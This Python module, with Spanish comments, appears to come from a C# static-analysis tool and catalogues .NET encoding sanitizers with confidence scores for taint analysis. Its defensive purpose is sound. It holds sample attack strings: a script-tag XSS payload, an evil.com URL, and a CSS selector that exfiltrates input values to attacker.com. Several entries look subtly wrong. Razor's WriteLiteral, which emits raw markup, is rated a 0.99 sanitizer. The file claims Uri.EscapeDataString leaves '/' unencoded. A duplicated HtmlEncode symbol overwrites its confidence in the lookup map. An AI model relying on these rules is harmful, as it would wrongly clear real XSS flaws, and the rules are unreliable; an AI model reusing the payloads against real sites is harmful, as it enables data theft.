# =============================================================================
#  csharp-sast / core / rules / sanitizers / encoding_sanitizers.py
# =============================================================================
#
#  CATÁLOGO DE SANITIZADORES DE ENCODING PARA C#
#  ────────────────────────────────────────────────
#  Define todos los métodos de .NET que codifican datos del usuario,
#  convirtiendo caracteres peligrosos en representaciones seguras
#  para el contexto de salida (HTML, JavaScript, URL, CSS, XML).
#
#  CONCEPTO DE SANITIZADOR EN SAST:
#    Un sanitizador interrumpe o transforma un flujo de datos tainted,
#    haciendo que los datos sean seguros para un contexto específico.
#    El taint_analyzer deja de propagar taint a través del nodo sanitizador
#    SOLO si el sanitizador es apropiado para el sink de destino.
#
#  ENCODING ES CONTEXTUAL — CRÍTICO:
#    El mismo dato puede requerir encodings DISTINTOS según dónde se use:
#
#    Dato:  <script>alert(1)</script>
#    ─────────────────────────────────────────────────────────────────
#    Contexto HTML:       &lt;script&gt;alert(1)&lt;/script&gt;
#    Contexto JavaScript: \x3Cscript\x3Ealert(1)\x3C\/script\x3E
#    Contexto URL:        %3Cscript%3Ealert%281%29%3C%2Fscript%3E
#    Contexto CSS:        \003C script\003E ...
#    Contexto XML attr:   &lt;script&gt;alert(1)&lt;/script&gt;
#    ─────────────────────────────────────────────────────────────────
#    HTML encoding NO previene XSS en contexto JavaScript.
#    URL encoding NO previene XSS en contexto HTML.
#
#  POR QUÉ ESTO IMPORTA PARA EL TAINT ANALYZER:
#    Si se detecta HtmlEncode() en el camino hacia un sink de tipo
#    HTML/Razor, el taint se interrumpe.
#    Si el mismo HtmlEncode() está en el camino hacia un sink de tipo
#    JavaScript (document.write), NO interrumpe el taint → false negative
#    si se elimina del análisis.
#
#  ESTRUCTURA DE CADA REGLA:
#    id                → Identificador único (SAN-ENC-NNN)
#    rule_type         → "sanitizer" (siempre)
#    symbol            → Prefijo del símbolo resuelto por Roslyn
#    name              → Nombre legible
#    sanitizes         → Lista de tipos de vulnerabilidad que neutraliza
#    sanitizer_type    → "ENCODING" (este módulo), "VALIDATION", "PARAMETERIZATION"
#    encoding_context  → Contextos donde este encoding es efectivo
#    confidence        → 0.0-1.0 — qué tan seguro es que esto sanitiza completamente
#    limitations       → Casos donde NO sanitiza (para reducir false negatives)
#    description       → Descripción del mecanismo
#    frameworks        → Frameworks donde está disponible
#    tags              → Etiquetas para filtrado
#
#  ALINEACIÓN CON CATÁLOGOS DE SINKS/SOURCES:
#    Mismos campos base, misma convención de naming.
#    El campo sanitizes[] usa los mismos valores que el campo
#    vulnerability en los sinks para hacer el matching.
#
# =============================================================================

from __future__ import annotations

ENCODING_SANITIZERS: list[dict] = [

    # =========================================================================
    #  HTML ENCODING — previene XSS en contextos HTML
    #  Convierte < > & " ' en entidades HTML.
    #  EFECTIVO contra: XSS en HTML body, atributos HTML, comentarios HTML.
    #  NO EFECTIVO contra: XSS en contexto JavaScript, CSS, URL.
    # =========================================================================

    {
        "id":              "SAN-ENC-001",
        "rule_type":       "sanitizer",
        "symbol":          "System.Net.WebUtility.HtmlEncode",
        "name":            "WebUtility.HtmlEncode — HTML encoding (BCL)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_attribute", "html_comment"],
        "confidence":      0.95,
        "limitations": (
            "No previene XSS en contextos JavaScript (<script>var x='encoded'</script>). "
            "No previene XSS en atributos de evento (onclick='encoded'). "
            "No previene XSS en contextos CSS (style='color:encoded'). "
            "No previene XSS en href con javascript: protocol. "
            "Para esos contextos usar JavaScriptEncoder, UrlEncoder o CSS encoder."
        ),
        "description": (
            "System.Net.WebUtility.HtmlEncode es el encoder HTML del BCL de .NET. "
            "Convierte: < → &lt;  > → &gt;  & → &amp;  \" → &quot;  ' → &#39; "
            "Disponible en todas las versiones de .NET sin dependencias adicionales. "
            "Previene XSS cuando los datos encodados se insertan en contexto HTML."
        ),
        "frameworks":      ["generic", "aspnetcore", "aspnet_mvc"],
        "tags":            ["encoding", "html", "xss", "bcl"],
    },
    {
        "id":              "SAN-ENC-002",
        "rule_type":       "sanitizer",
        "symbol":          "System.Web.HttpUtility.HtmlEncode",
        "name":            "HttpUtility.HtmlEncode — HTML encoding (System.Web)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_attribute"],
        "confidence":      0.95,
        "limitations": (
            "Solo para contextos HTML. Mismo comportamiento que WebUtility.HtmlEncode. "
            "System.Web solo disponible en .NET Framework / ASP.NET MVC clásico."
        ),
        "description": (
            "System.Web.HttpUtility.HtmlEncode — encoder HTML de ASP.NET clásico. "
            "Mismo comportamiento que WebUtility.HtmlEncode para la mayoría de caracteres. "
            "Disponible en aplicaciones ASP.NET MVC y WebForms."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "html", "xss", "system.web"],
    },
    {
        "id":              "SAN-ENC-003",
        "rule_type":       "sanitizer",
        "symbol":          "System.Text.Encodings.Web.HtmlEncoder.Encode",
        "name":            "HtmlEncoder.Encode — HTML encoding moderno (.NET Core)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_attribute", "html_comment"],
        "confidence":      0.98,
        "limitations": (
            "Solo para contextos HTML. "
            "Para JavaScript usar JavaScriptEncoder.Default.Encode(). "
            "Para URLs usar UrlEncoder.Default.Encode()."
        ),
        "description": (
            "System.Text.Encodings.Web.HtmlEncoder es el encoder HTML recomendado "
            "para ASP.NET Core. Es configurable, más eficiente que HttpUtility.HtmlEncode "
            "y permite customizar qué caracteres se encodean. "
            "Confidence 0.98 — es el método más robusto y recomendado por Microsoft."
        ),
        "frameworks":      ["aspnetcore"],
        "tags":            ["encoding", "html", "xss", "dotnetcore", "recommended"],
    },
    {
        "id":              "SAN-ENC-004",
        "rule_type":       "sanitizer",
        "symbol":          "System.Text.Encodings.Web.HtmlEncoder.Default",
        "name":            "HtmlEncoder.Default — instancia singleton del HtmlEncoder",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_attribute"],
        "confidence":      0.98,
        "limitations":     "Solo para contextos HTML.",
        "description": (
            "HtmlEncoder.Default es la instancia singleton del encoder HTML de .NET Core. "
            "Se usa cuando el HtmlEncoder se inyecta via DI."
        ),
        "frameworks":      ["aspnetcore"],
        "tags":            ["encoding", "html", "xss", "di", "singleton"],
    },

    # =========================================================================
    #  ANTIXSS LIBRARY — encoding con whitelist approach (más seguro)
    #  La librería Microsoft AntiXSS usa whitelist de caracteres seguros
    #  en lugar de blacklist — más robusta contra bypass.
    # =========================================================================

    {
        "id":              "SAN-ENC-005",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.Security.Application.Encoder.HtmlEncode",
        "name":            "AntiXss.HtmlEncode — encoding con whitelist (Microsoft AntiXSS)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_attribute"],
        "confidence":      0.99,
        "limitations": (
            "Librería legacy (Microsoft.Security.Application). "
            "En aplicaciones .NET Core modernas preferir HtmlEncoder de System.Text.Encodings.Web."
        ),
        "description": (
            "Microsoft AntiXSS Library usa un enfoque de WHITELIST: "
            "en lugar de encodar caracteres peligrosos conocidos (blacklist), "
            "solo permite pasar caracteres explícitamente seguros. "
            "Es el método de encoding más robusto disponible para .NET Framework. "
            "Confidence 0.99 — prácticamente inmune a técnicas de bypass de encoding."
        ),
        "frameworks":      ["aspnet_mvc", "generic"],
        "tags":            ["encoding", "html", "xss", "antixss", "whitelist", "high-confidence"],
    },
    {
        "id":              "SAN-ENC-006",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.Security.Application.Encoder.HtmlAttributeEncode",
        "name":            "AntiXss.HtmlAttributeEncode — encoding para atributos HTML",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_attribute"],
        "confidence":      0.99,
        "limitations":     "Solo para el valor de atributos HTML (no para el cuerpo del documento).",
        "description": (
            "AntiXSS HtmlAttributeEncode — especializado para valores de atributos HTML. "
            "Más restrictivo que HtmlEncode porque los atributos tienen reglas "
            "de parsing distintas al body HTML."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "html", "attribute", "antixss"],
    },

    # =========================================================================
    #  JAVASCRIPT ENCODING — previene XSS en contextos JavaScript
    #  Convierte caracteres especiales en secuencias de escape JS (\xNN, \uNNNN).
    #  NECESARIO cuando datos se insertan dentro de bloques <script> o
    #  en event handlers (onclick="...").
    # =========================================================================

    {
        "id":              "SAN-ENC-007",
        "rule_type":       "sanitizer",
        "symbol":          "System.Text.Encodings.Web.JavaScriptEncoder.Encode",
        "name":            "JavaScriptEncoder.Encode — encoding para contexto JavaScript",
        "sanitizes":       ["XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["javascript_string", "json_value"],
        "confidence":      0.95,
        "limitations": (
            "Solo efectivo para datos insertados dentro de strings JavaScript delimitados. "
            "No protege contra XSS cuando el dato controla la estructura del script "
            "(e.g., si el dato es el nombre de una función a llamar). "
            "No reemplaza HtmlEncoder para contextos HTML."
        ),
        "description": (
            "System.Text.Encodings.Web.JavaScriptEncoder encoda caracteres "
            "para uso seguro dentro de strings JavaScript. "
            "Convierte: < → \\u003C  > → \\u003E  & → \\u0026  ' → \\u0027  \" → \\u0022 "
            "Necesario cuando se inserta data en: <script>var x = '@encoded'</script>"
        ),
        "frameworks":      ["aspnetcore", "aspnet_mvc"],
        "tags":            ["encoding", "javascript", "xss", "script"],
    },
    {
        "id":              "SAN-ENC-008",
        "rule_type":       "sanitizer",
        "symbol":          "System.Text.Encodings.Web.JavaScriptEncoder.Default",
        "name":            "JavaScriptEncoder.Default — instancia singleton del JS encoder",
        "sanitizes":       ["XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["javascript_string"],
        "confidence":      0.95,
        "limitations":     "Solo para strings JavaScript. No para HTML body.",
        "description": (
            "JavaScriptEncoder.Default — instancia singleton del encoder JavaScript. "
            "Usar vía inyección de dependencias o directamente."
        ),
        "frameworks":      ["aspnetcore"],
        "tags":            ["encoding", "javascript", "xss", "singleton"],
    },
    {
        "id":              "SAN-ENC-009",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.Security.Application.Encoder.JavaScriptEncode",
        "name":            "AntiXss.JavaScriptEncode — encoding JS con whitelist",
        "sanitizes":       ["XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["javascript_string"],
        "confidence":      0.99,
        "limitations":     "Solo para strings JavaScript en aplicaciones .NET Framework.",
        "description": (
            "AntiXSS JavaScriptEncode con whitelist approach para contextos JavaScript. "
            "Más robusto que el encoder estándar de .NET."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "javascript", "antixss", "whitelist"],
    },

    # =========================================================================
    #  URL ENCODING — previene injection en URLs y query strings
    #  Convierte caracteres especiales en %HH.
    # =========================================================================

    {
        "id":              "SAN-ENC-010",
        "rule_type":       "sanitizer",
        "symbol":          "System.Text.Encodings.Web.UrlEncoder.Encode",
        "name":            "UrlEncoder.Encode — encoding para URLs (.NET Core)",
        "sanitizes":       ["OPEN_REDIRECT", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_query_value", "url_path_segment"],
        "confidence":      0.90,
        "limitations": (
            "Confidence 0.90 — URL encoding NO previene SSRF: "
            "http://evil.com?url=encoded es una URL válida. "
            "Para SSRF usar whitelist de hosts, no solo encoding. "
            "No protege si el dato controla toda la URL (protocolo + host)."
        ),
        "description": (
            "System.Text.Encodings.Web.UrlEncoder encoda datos para uso seguro "
            "en componentes de URL (query string values, path segments). "
            "Convierte: espacios → %20  < → %3C  > → %3E  etc. "
            "Previene HTTP Response Splitting y Open Redirect cuando se usa correctamente."
        ),
        "frameworks":      ["aspnetcore"],
        "tags":            ["encoding", "url", "http", "redirect"],
    },
    {
        "id":              "SAN-ENC-011",
        "rule_type":       "sanitizer",
        "symbol":          "System.Net.WebUtility.UrlEncode",
        "name":            "WebUtility.UrlEncode — URL encoding (BCL)",
        "sanitizes":       ["OPEN_REDIRECT"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_query_value"],
        "confidence":      0.88,
        "limitations": (
            "No previene SSRF — solo encoda caracteres, no valida el host. "
            "Codifica espacios como '+' (application/x-www-form-urlencoded), "
            "no como '%20' — comportamiento diferente a Uri.EscapeDataString."
        ),
        "description": (
            "System.Net.WebUtility.UrlEncode — encoder URL del BCL. "
            "Encoda para query strings en formato application/x-www-form-urlencoded. "
            "Diferencia de Uri.EscapeDataString: codifica espacio como '+' no '%20'."
        ),
        "frameworks":      ["generic", "aspnetcore"],
        "tags":            ["encoding", "url", "querystring"],
    },
    {
        "id":              "SAN-ENC-012",
        "rule_type":       "sanitizer",
        "symbol":          "System.Web.HttpUtility.UrlEncode",
        "name":            "HttpUtility.UrlEncode — URL encoding (System.Web)",
        "sanitizes":       ["OPEN_REDIRECT"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_query_value"],
        "confidence":      0.88,
        "limitations":     "Solo disponible en .NET Framework. No previene SSRF.",
        "description": (
            "System.Web.HttpUtility.UrlEncode — URL encoder de ASP.NET MVC clásico. "
            "Equivalente a WebUtility.UrlEncode para el análisis de taint."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "url", "system.web"],
    },
    {
        "id":              "SAN-ENC-013",
        "rule_type":       "sanitizer",
        "symbol":          "System.Uri.EscapeDataString",
        "name":            "Uri.EscapeDataString — percent-encoding RFC 3986",
        "sanitizes":       ["OPEN_REDIRECT", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_query_value", "url_path_segment"],
        "confidence":      0.92,
        "limitations": (
            "No previene SSRF si el atacante controla el host de la URL. "
            "No encoda el carácter '/' — no usar para path segments que deben ser seguros."
        ),
        "description": (
            "Uri.EscapeDataString encoda según RFC 3986 (percent-encoding). "
            "Encoda espacio como '%20' (correcto para URLs), a diferencia "
            "de WebUtility.UrlEncode que usa '+'."
        ),
        "frameworks":      ["generic", "aspnetcore"],
        "tags":            ["encoding", "url", "rfc3986", "percent-encoding"],
    },
    {
        "id":              "SAN-ENC-014",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.Security.Application.Encoder.UrlEncode",
        "name":            "AntiXss.UrlEncode — URL encoding con whitelist",
        "sanitizes":       ["OPEN_REDIRECT", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_query_value"],
        "confidence":      0.95,
        "limitations":     "Solo .NET Framework. No previene SSRF.",
        "description": (
            "AntiXSS UrlEncode con whitelist approach. "
            "Más restrictivo que WebUtility.UrlEncode — solo permite caracteres "
            "explícitamente seguros."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "url", "antixss", "whitelist"],
    },
    {
        "id":              "SAN-ENC-015",
        "rule_type":       "sanitizer",
        "symbol":          "System.Uri.EscapeUriString",
        "name":            "Uri.EscapeUriString — encoding de URI completa",
        "sanitizes":       ["OPEN_REDIRECT"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_full"],
        "confidence":      0.70,
        "limitations": (
            "Confidence 0.70 — EscapeUriString es más permisivo que EscapeDataString: "
            "no encoda ':', '/', '?', '#', etc. porque son caracteres válidos de URI. "
            "Para valores individuales de query string, usar EscapeDataString."
        ),
        "description": (
            "Uri.EscapeUriString encoda una URI completa, preservando caracteres "
            "especiales que son válidos en URIs (/, ?, &, etc.). "
            "Solo encoda caracteres absolutamente inválidos en URIs."
        ),
        "frameworks":      ["generic"],
        "tags":            ["encoding", "url", "uri", "low-confidence"],
    },

    # =========================================================================
    #  XML ENCODING — previene injection en atributos y texto XML
    # =========================================================================

    {
        "id":              "SAN-ENC-016",
        "rule_type":       "sanitizer",
        "symbol":          "System.Security.SecurityElement.Escape",
        "name":            "SecurityElement.Escape — XML encoding de caracteres especiales",
        "sanitizes":       ["XXE", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["xml_text", "xml_attribute"],
        "confidence":      0.90,
        "limitations": (
            "Confidence 0.90 — no previene XXE si se usa en parsers mal configurados. "
            "XXE se previene en el parser (DtdProcessing=Prohibit), "
            "no en el encoding del dato. "
            "Previene XML injection en datos dentro de un documento XML."
        ),
        "description": (
            "System.Security.SecurityElement.Escape encoda caracteres especiales XML: "
            "< → &lt;  > → &gt;  & → &amp;  \" → &quot;  ' → &apos; "
            "Previene XML injection cuando datos del usuario se incluyen en XML."
        ),
        "frameworks":      ["generic", "aspnetcore"],
        "tags":            ["encoding", "xml", "injection"],
    },
    {
        "id":              "SAN-ENC-017",
        "rule_type":       "sanitizer",
        "symbol":          "System.Xml.XmlConvert.EncodeName",
        "name":            "XmlConvert.EncodeName — encoding de nombres XML",
        "sanitizes":       ["XXE"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["xml_element_name", "xml_attribute_name"],
        "confidence":      0.85,
        "limitations": (
            "Solo para nombres de elementos/atributos XML, no para valores. "
            "Para valores usar SecurityElement.Escape."
        ),
        "description": (
            "XmlConvert.EncodeName encoda nombres de elementos y atributos XML, "
            "reemplazando caracteres inválidos en nombres XML."
        ),
        "frameworks":      ["generic"],
        "tags":            ["encoding", "xml", "name"],
    },

    # =========================================================================
    #  HTML SANITIZER — limpieza de HTML del usuario (diferente a encoding)
    #  Permite que el usuario envíe HTML pero elimina tags peligrosos.
    #  Se usa cuando se quiere permitir formato HTML (WYSIWYG editors, CMS).
    # =========================================================================

    {
        "id":              "SAN-ENC-018",
        "rule_type":       "sanitizer",
        "symbol":          "Ganss.Xss.HtmlSanitizer.Sanitize",
        "name":            "HtmlSanitizer.Sanitize — limpieza de HTML (NuGet Ganss.Xss)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_rich_text"],
        "confidence":      0.97,
        "limitations": (
            "Confidence 0.97 — HtmlSanitizer es robusto pero: "
            "la configuración por defecto puede ser permisiva. "
            "Verificar que AllowedTags, AllowedAttributes y AllowedSchemes "
            "estén configurados correctamente para el caso de uso. "
            "No usar la instancia sin configurar si el contexto requiere seguridad estricta."
        ),
        "description": (
            "Ganss.Xss.HtmlSanitizer es la librería de sanitización HTML más "
            "recomendada para .NET. Usa una whitelist de tags, atributos y esquemas "
            "de URL permitidos, eliminando todo lo que no esté explícitamente permitido. "
            "Usar cuando se quiere permitir HTML del usuario (editores WYSIWYG, CMS). "
            "A diferencia de HtmlEncode que elimina el formato, Sanitize "
            "permite HTML seguro y elimina el peligroso."
        ),
        "frameworks":      ["generic", "aspnetcore", "aspnet_mvc"],
        "tags":            ["encoding", "html", "sanitize", "wysiwyg", "cms", "whitelist"],
    },
    {
        "id":              "SAN-ENC-019",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.AspNetCore.Html.HtmlContentBuilder.Append",
        "name":            "HtmlContentBuilder.Append — encoding automático en Razor (ASP.NET Core)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body"],
        "confidence":      0.98,
        "limitations": (
            "Solo efectivo cuando se usa Append() (encoding automático). "
            "AppendHtml() NO encoda — es un sink, no un sanitizador."
        ),
        "description": (
            "HtmlContentBuilder.Append() en Tag Helpers de ASP.NET Core "
            "encoda automáticamente los datos añadidos. "
            "Es el equivalente de @variable en Razor para Tag Helpers."
        ),
        "frameworks":      ["aspnetcore"],
        "tags":            ["encoding", "razor", "taghelper", "automatic"],
    },

    # =========================================================================
    #  LOG SANITIZERS — previene Log Injection
    #  Limpieza de CR/LF y caracteres de control en datos que van a logs.
    # =========================================================================

    {
        "id":              "SAN-ENC-020",
        "rule_type":       "sanitizer",
        "symbol":          "System.Text.RegularExpressions.Regex.Replace",
        "name":            "Regex.Replace — eliminación de caracteres de control (log sanitization)",
        "sanitizes":       ["LOG_INJECTION"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["log_entry"],
        "confidence":      0.75,
        "limitations": (
            "Confidence 0.75 — solo sanitiza Log Injection si el patrón regex "
            "elimina correctamente CR (\\r), LF (\\n) y otros caracteres de control. "
            "Un patrón incorrecto puede ser bypasseado. "
            "Regex.Replace genérico tiene baja confianza — depende del patrón específico."
        ),
        "description": (
            "Regex.Replace se usa para eliminar caracteres peligrosos antes de "
            "escribir en logs. Para Log Injection el patrón correcto es: "
            "Regex.Replace(input, @'[\\r\\n\\t]', '_') "
            "para eliminar CR, LF y TAB que podrían inyectar entradas falsas en el log."
        ),
        "frameworks":      ["generic", "aspnetcore"],
        "tags":            ["encoding", "log", "regex", "log-injection", "crlf"],
    },
    {
        "id":              "SAN-ENC-021",
        "rule_type":       "sanitizer",
        "symbol":          "System.String.Replace",
        "name":            "String.Replace — reemplazo de caracteres específicos",
        "sanitizes":       ["LOG_INJECTION", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["log_entry", "html_text"],
        "confidence":      0.50,
        "limitations": (
            "Confidence 0.50 — String.Replace es un sanitizador muy débil. "
            "Solo es efectivo si se reemplazan TODOS los caracteres peligrosos "
            "para el contexto específico. "
            "Un solo caracter olvidado invalida la sanitización. "
            "Preferir encoders especializados (HtmlEncoder, etc.)."
        ),
        "description": (
            "String.Replace puede usarse para sanitización simple, pero es "
            "extremadamente frágil. Reportado con confianza baja — "
            "el taint_analyzer debería mantener el taint en la mayoría de casos."
        ),
        "frameworks":      ["generic"],
        "tags":            ["encoding", "string", "replace", "low-confidence"],
    },

    # =========================================================================
    #  HEADER SANITIZERS — previene HTTP Response Splitting / Header Injection
    # =========================================================================

    {
        "id":              "SAN-ENC-022",
        "rule_type":       "sanitizer",
        "symbol":          "System.Net.WebUtility.HtmlEncode",
        "name":            "WebUtility.HtmlEncode — sanitización de valores de header",
        "sanitizes":       ["XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["http_header_value"],
        "confidence":      0.80,
        "limitations": (
            "Confidence 0.80 — HtmlEncode encoda caracteres HTML pero no CR/LF. "
            "Para Header Injection (HTTP Response Splitting) el riesgo real "
            "es CR (\\r, %0D) y LF (\\n, %0A). "
            "ASP.NET Core valida headers automáticamente y lanza InvalidOperationException, "
            "por lo que en .NET Core moderno el riesgo es mitigado por el framework."
        ),
        "description": (
            "Uso de HtmlEncode en valores de headers HTTP. "
            "Parcialmente efectivo — ver limitaciones sobre CR/LF."
        ),
        "frameworks":      ["generic"],
        "tags":            ["encoding", "header", "response-splitting", "medium-confidence"],
    },

    # =========================================================================
    #  CSS ENCODING — previene CSS injection
    # =========================================================================

    {
        "id":              "SAN-ENC-023",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.Security.Application.Encoder.CssEncode",
        "name":            "AntiXss.CssEncode — encoding para contextos CSS",
        "sanitizes":       ["XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["css_value", "css_property"],
        "confidence":      0.95,
        "limitations": (
            "Solo para aplicaciones .NET Framework con la librería AntiXSS. "
            "En .NET Core no hay un CSS encoder equivalente en el BCL. "
            "No usar datos del usuario en contextos CSS si es posible evitarlo."
        ),
        "description": (
            "AntiXSS CssEncode — el único encoder CSS disponible para .NET. "
            "Previene CSS injection que puede usarse para exfiltrar datos "
            "via attribute selectors (input[value^='a'] { background: url('attacker.com?a') })."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "css", "css-injection", "antixss"],
    },
    {
        "id":              "SAN-ENC-024",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.Security.Application.Encoder.UrlPathEncode",
        "name":            "AntiXss.UrlPathEncode — encoding para segmentos de ruta URL",
        "sanitizes":       ["PATH_TRAVERSAL", "OPEN_REDIRECT"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["url_path_segment"],
        "confidence":      0.80,
        "limitations": (
            "Confidence 0.80 — el encoding de path por sí solo no previene "
            "completamente Path Traversal. También se necesita validar que "
            "la ruta resultante esté dentro del directorio base permitido."
        ),
        "description": (
            "AntiXSS UrlPathEncode para segmentos de path en URLs. "
            "Encoda caracteres que son inválidos en segmentos de path. "
            "Complementario a la validación de directorio base para Path Traversal."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "url", "path", "antixss"],
    },

    # =========================================================================
    #  RAZOR ENCODING AUTOMÁTICO — detectar el patrón @variable en Razor
    #  Razor hace HTML encoding automáticamente con la sintaxis @variable.
    #  Este es el sanitizador más común en ASP.NET Core.
    # =========================================================================

    {
        "id":              "SAN-ENC-025",
        "rule_type":       "sanitizer",
        "symbol":          "Microsoft.AspNetCore.Mvc.Razor.RazorPage.WriteLiteral",
        "name":            "Razor @variable encoding automático (WriteLiteral sanitizado)",
        "sanitizes":       ["RAZOR_XSS", "XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body", "html_attribute"],
        "confidence":      0.99,
        "limitations": (
            "Solo para la sintaxis @variable en Razor. "
            "Html.Raw() bypasea este encoding → es un sink, no un sanitizador. "
            "Solo aplica al contexto HTML — no protege en bloques <script>."
        ),
        "description": (
            "Razor (@variable) hace HTML encoding automático vía WriteLiteral. "
            "Es el mecanismo de defensa XSS por defecto en ASP.NET Core Razor. "
            "Equivale a llamar HtmlEncoder.Encode() en cada expresión @. "
            "Confidence 0.99 — el mecanismo más usado y más seguro en ASP.NET Core."
        ),
        "frameworks":      ["aspnetcore"],
        "tags":            ["encoding", "razor", "automatic", "default", "html"],
    },
    {
        "id":              "SAN-ENC-026",
        "rule_type":       "sanitizer",
        "symbol":          "System.Web.HttpServerUtility.HtmlEncode",
        "name":            "Server.HtmlEncode — encoding via HttpServerUtility (WebForms)",
        "sanitizes":       ["XSS", "RAZOR_XSS"],
        "sanitizer_type":  "ENCODING",
        "encoding_context": ["html_body"],
        "confidence":      0.92,
        "limitations":     "Solo disponible en ASP.NET WebForms y MVC clásico (System.Web).",
        "description": (
            "Server.HtmlEncode() en ASP.NET WebForms — accedido via Page.Server.HtmlEncode(). "
            "Equivalente a HttpUtility.HtmlEncode para el análisis de taint."
        ),
        "frameworks":      ["aspnet_mvc"],
        "tags":            ["encoding", "html", "webforms", "server"],
    },
]


# ─────────────────────────────────────────────────────────────────────────────
#  FUNCIONES DE ACCESO AL CATÁLOGO
# ─────────────────────────────────────────────────────────────────────────────

def get_encoding_sanitizer_rules() -> list[dict]:
    """Retorna el catálogo completo de sanitizadores de encoding."""
    return ENCODING_SANITIZERS


def get_encoding_sanitizer_symbols() -> set[str]:
    """Retorna el conjunto de prefijos de símbolo para lookup O(1)."""
    return {rule["symbol"] for rule in ENCODING_SANITIZERS}


def get_sanitizers_for_vulnerability(vulnerability: str) -> list[dict]:
    """
    Retorna los sanitizadores que neutralizan un tipo específico de vulnerabilidad.
    Args:
        vulnerability: e.g. "RAZOR_XSS", "XSS", "OPEN_REDIRECT", "LOG_INJECTION"
    """
    return [
        r for r in ENCODING_SANITIZERS
        if vulnerability in r.get("sanitizes", [])
    ]


def get_html_encoding_sanitizers() -> list[dict]:
    """Retorna sanitizadores efectivos para contextos HTML."""
    return [
        r for r in ENCODING_SANITIZERS
        if "html_body" in r.get("encoding_context", [])
        or "html_attribute" in r.get("encoding_context", [])
    ]


def get_javascript_encoding_sanitizers() -> list[dict]:
    """Retorna sanitizadores efectivos para contextos JavaScript."""
    return [
        r for r in ENCODING_SANITIZERS
        if "javascript_string" in r.get("encoding_context", [])
    ]


def get_high_confidence_sanitizers(min_confidence: float = 0.90) -> list[dict]:
    """Retorna sanitizadores con confianza >= min_confidence."""
    return [
        r for r in ENCODING_SANITIZERS
        if r.get("confidence", 0.0) >= min_confidence
    ]


def get_sanitizer_confidence_map() -> dict[str, float]:
    """
    Retorna mapa {symbol_prefix: confidence} para el TaintAnalyzer.
    Usado para determinar si el taint debe detenerse completamente
    o reducirse (confianza parcial).
    """
    return {
        rule["symbol"]: rule.get("confidence", 0.0)
        for rule in ENCODING_SANITIZERS
    }


def get_sanitizes_vulnerabilities_map() -> dict[str, list[str]]:
    """
    Retorna mapa {symbol_prefix: [vulnerability_kinds]} para matching
    rápido en el TaintAnalyzer.
    """
    return {
        rule["symbol"]: rule.get("sanitizes", [])
        for rule in ENCODING_SANITIZERS
    }